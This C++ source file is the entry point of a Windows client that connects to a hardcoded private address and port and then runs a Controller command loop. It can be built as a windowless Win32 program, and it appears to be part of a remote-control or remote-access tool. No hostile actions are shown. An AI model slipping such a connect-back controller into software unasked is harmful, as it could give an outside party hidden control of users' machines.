#include <Windows.h>
#include <iostream>
#include <memory>
#include <exception>
#include "packetconnection.h"
#include "controller.h"
using namespace std;

/**
 * Main entry function. Define `WINGUI` to compile into Win32 Subsystem .exe.
 */
#ifdef WINGUI
int WinMain(HINSTANCE hInst, HINSTANCE prev, PSTR lpCmdLine, int nCmdShow) {
#else
int main(int argc, char* argv[]) {
#endif
	//TODO: parse arguments?
	string host = "10.0.0.67";
	int port = 6997;

	try {
		//Initialize PacketConnection to start
		unique_ptr<PacketConnection> conn = make_unique<PacketConnection>(host, port);
		conn->connect();
		cout << "Connected to " << host << ":" << to_string(port).c_str() << endl;
		//Wrap PacketConnection in Controller and run main loop
		//TODO: handle segfaults?
		Controller controller(move(conn));
		controller.loop();
	} catch (asio::system_error& ex) {
		cerr << "Something went wrong: " << ex.what() << endl;
	} catch (std::exception& ex) {
		cerr << "Something went wrong: " << ex.what() << endl;
	}
}
